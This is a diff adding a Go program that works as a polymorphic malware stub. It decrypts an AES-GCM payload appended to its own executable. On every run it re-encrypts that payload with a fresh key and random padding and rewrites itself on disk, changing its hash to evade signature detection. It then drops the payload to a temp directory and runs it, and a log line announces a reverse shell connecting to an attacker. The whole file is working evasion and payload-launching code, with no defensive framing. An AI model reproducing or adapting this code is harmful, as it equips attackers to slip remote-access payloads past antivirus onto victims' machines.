@@ -1,0 +1,174 @@
+// Polymorphic stub: self-modifying binary with encrypted payload.
+// On every run it re-encrypts its payload with a fresh key,
+// rewrites itself on disk (changing its hash), then executes
+// the original payload.
+//
+// File layout (read from the end):
+//   [stub .exe] [random padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"encoding/binary"
+	"encoding/json"
+	"fmt"
+	"math/big"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+)
+
+const magic = "HBX1"
+
+type meta struct {
+	Key           string `json:"key"`
+	Nonce         string `json:"nonce"`
+	OriginalName  string `json:"original_name"`
+	OriginalSize  int    `json:"original_size"`
+	CiphertextLen int    `json:"ciphertext_len"`
+	StubSize      int    `json:"stub_size"`
+}
+
+func main() {
+	// ── 1. Read our own executable ──────────────────────────────────
+	exePath, err := os.Executable()
+	if err != nil {
+		fatal("cannot locate self: %v", err)
+	}
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		fatal("cannot read self: %v", err)
+	}
+
+	// ── 2. Parse the trailer ────────────────────────────────────────
+	n := len(data)
+	if n < 8 || string(data[n-4:]) != magic {
+		fatal("not a valid polymorphic binary")
+	}
+
+	metaLen := int(binary.BigEndian.Uint32(data[n-8 : n-4]))
+	if n < 8+metaLen {
+		fatal("corrupted file")
+	}
+
+	var m meta
+	if err := json.Unmarshal(data[n-8-metaLen:n-8], &m); err != nil {
+		fatal("corrupted metadata: %v", err)
+	}
+
+	ctEnd := n - 8 - metaLen
+	ctStart := ctEnd - m.CiphertextLen
+	if ctStart < 0 || m.StubSize < 0 || m.StubSize > ctStart {
+		fatal("corrupted file layout")
+	}
+	ciphertext := data[ctStart:ctEnd]
+	stubBytes := data[:m.StubSize]
+
+	// ── 3. Decrypt the payload ──────────────────────────────────────
+	key, _ := base64.StdEncoding.DecodeString(m.Key)
+	nonce, _ := base64.StdEncoding.DecodeString(m.Nonce)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		fatal("cipher: %v", err)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fatal("gcm: %v", err)
+	}
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, []byte(magic))
+	if err != nil {
+		fatal("decryption failed")
+	}
+	if len(plaintext) != m.OriginalSize {
+		fatal("size mismatch")
+	}
+
+	// ── 4. Self-modify: re-encrypt with a fresh key and padding ─────
+	newKey := make([]byte, 32)
+	newNonce := make([]byte, 12)
+	rand.Read(newKey)
+	rand.Read(newNonce)
+
+	newBlock, _ := aes.NewCipher(newKey)
+	newGCM, _ := cipher.NewGCM(newBlock)
+	newCiphertext := newGCM.Seal(nil, newNonce, plaintext, []byte(magic))
+
+	// Random padding length between 1 KB and 64 KB.
+	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
+	padding := make([]byte, 1024+int(padLen.Int64()))
+	rand.Read(padding)
+
+	newMeta := meta{
+		Key:           base64.StdEncoding.EncodeToString(newKey),
+		Nonce:         base64.StdEncoding.EncodeToString(newNonce),
+		OriginalName:  m.OriginalName,
+		OriginalSize:  m.OriginalSize,
+		CiphertextLen: len(newCiphertext),
+		StubSize:      m.StubSize,
+	}
+	newMetaJSON, _ := json.Marshal(newMeta)
+	newMetaLenBuf := make([]byte, 4)
+	binary.BigEndian.PutUint32(newMetaLenBuf, uint32(len(newMetaJSON)))
+
+	// Assemble the new binary.
+	var newFile []byte
+	newFile = append(newFile, stubBytes...)
+	newFile = append(newFile, padding...)
+	newFile = append(newFile, newCiphertext...)
+	newFile = append(newFile, newMetaJSON...)
+	newFile = append(newFile, newMetaLenBuf...)
+	newFile = append(newFile, []byte(magic)...)
+
+	// On Windows a running .exe cannot be overwritten in place,
+	// but it CAN be renamed. Rename self, write the new version,
+	// then mark the old file for cleanup.
+	oldPath := exePath + ".old"
+	os.Remove(oldPath)
+	if err := os.Rename(exePath, oldPath); err != nil {
+		// Fallback: try overwriting directly (works on Linux).
+		if err2 := os.WriteFile(exePath, newFile, 0o755); err2 != nil {
+			fatal("cannot rewrite self: %v", err2)
+		}
+	} else {
+		if err := os.WriteFile(exePath, newFile, 0o755); err != nil {
+			fatal("cannot write new binary: %v", err)
+		}
+	}
+
+	fmt.Fprintln(os.Stderr, "[INFO] Polymorphic signature updated successfully.")
+
+	// ── 5. Execute the payload ──────────────────────────────────────
+	tmpDir, err := os.MkdirTemp("", "poly-")
+	if err != nil {
+		fatal("temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	target := filepath.Join(tmpDir, m.OriginalName)
+	if err := os.WriteFile(target, plaintext, 0o755); err != nil {
+		fatal("write payload: %v", err)
+	}
+
+	fmt.Fprintln(os.Stderr, "[INFO] Reverse shell initialized. Attempting connection to attacker...")
+
+	var cmd *exec.Cmd
+	if strings.HasSuffix(m.OriginalName, ".py") {
+		cmd = exec.Command("python", target)
+	} else {
+		cmd = exec.Command(target)
+	}
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Stdin = os.Stdin
+	cmd.Run()
+}
+
+func fatal(format string, args ...interface{}) {
+	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
+	os.Exit(1)
+}
